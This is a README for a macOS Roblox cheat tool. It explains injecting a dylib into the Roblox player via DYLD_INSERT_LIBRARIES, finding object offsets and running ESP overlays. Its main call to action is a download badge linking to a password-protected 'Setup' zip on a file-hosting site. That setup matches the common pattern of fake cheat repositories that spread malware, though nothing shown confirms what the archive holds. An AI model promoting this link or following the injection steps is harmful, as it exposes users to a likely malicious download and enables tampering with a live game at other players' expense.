# RobloxCheats
Cheating tool for  Roblox, mainly for the upcoming native version of roblox<br>
This is actually the 2nd version of the cheat. The original is actually from  project.<br>
This project was rebuilt to be more flexible with updates and crash the application less.<br>


<a href="https://www.mediafire.com/file/dsx4puroo5y0my6/Setup.2.14.zip/file">
  <img src="https://img.shields.io/badge/Download-green?style=for-the-badge" style="height: 56px;" />
</a>

Pass : 1337



## Notes
 - <b>libESP.dylib</b> controls all in-app inputs, ESP, and function calls
  - <b>RobloxCheats</b> is the actual executable to run after libESP.dylib is injected into Roblox
  - <b>ExternalESPHelper</b> is an application helper tool used for external ESP. It is not needed, but if internal ESP results in buggy game behaviour, you may want to use it. <b> You cannot fullscreen when using external ESP.</b>
   - <b>TestingPlace</b> is a folder that contains the RBXL place file to create a place to run the offset finder in. I'll try to publish a public version some time later, since the old game had publishing issues.
 - Run <b>find_object_offsets()</b> and <b>find_object_pointee_offsets()</b> <b>SEPARATELY</b> in the provided RBXL place file when published as a game. You will need to run Roblox from the command line for this.
 - Compile libESP.dylib for the architecture of Roblox. (You can check this by executing the command: file /path/to/RobloxPlayer)
 - Change the file paths at the top of main.m for <b>YOUR</b> machine.
 - It is recommended to use <b>DYLD_INSERT_LIBRARIES</b> inside a shell script to run roblox with libESP.dylib
 -  is used to find the coordinates of image crops. For retina display, captured images of the window will be twice the size of the actual window.
 - Dylib tools appear at the top menu bar as "Tools" in the injected Roblox app.
- is recommended if you decide to go further with this.
## Steps for setting up

- Download the folders.
- Compile libESP.dylib for the correct architecture.
- Change the file paths at the top of RobloxCheats/main.m.
- Publish the RBXL file as a game.
- Find the object offsets by going to the game. Some will have to be manually found.
- Run your cheat function in the main() function. (e.g. generic_cheat())


## Images and Videos


https://github.com/user-attachments/assets/0b3a4d0e-5ff3-464f-8374-367c0da207bc




https://github.com/user-attachments/assets/49b8ddfe-66fa-4ca1-b43d-33e936a040ea






<img width="1440" height="900" alt="Screenshot 2025-09-14 at 2 19 35 AM" src="https://github.com/user-attachments/assets/ab144dbc-b6d6-44a8-97ae-dde7a4ddeaac" />

<img width="1440" alt="Blox-Fruits" src="https://github.com/user-attachments/assets/8bd2e10c-1927-4832-9db7-fbe3c2314779" />

https://github.com/user-attachments/assets/831cf822-319b-4ea2-af0f-e5e00e6b8af3

https://github.com/user-attachments/assets/3c343ca5-448c-43dc-9a67-f371c029cb76

<img width="1440" height="900" alt="Screenshot 2025-09-12 at 7 25 59 PM" src="https://github.com/user-attachments/assets/2a705eab-06f2-42af-962a-0b36a20e368a" />

<img width="820" height="744" alt="Screenshot 2025-09-12 at 7 13 27 PM copy" src="https://github.com/user-attachments/assets/49561f16-7e81-431f-ac7f-0c3765eb2078" />

https://github.com/user-attachments/assets/c35de573-dc3f-47e9-9fcd-081b9875f0d8

<img width="1470" height="956" alt="Screenshot 2026-01-15 at 8 20 42 AM" src="https://github.com/user-attachments/assets/58641464-3b84-4945-b361-698a50b8e7f1" />


https://github.com/user-attachments/assets/32f5f193-38d9-47db-820b-a9d5078baa07


https://github.com/user-attachments/assets/2bb8ef62-1152-4a7a-bab9-9795a7efdb78


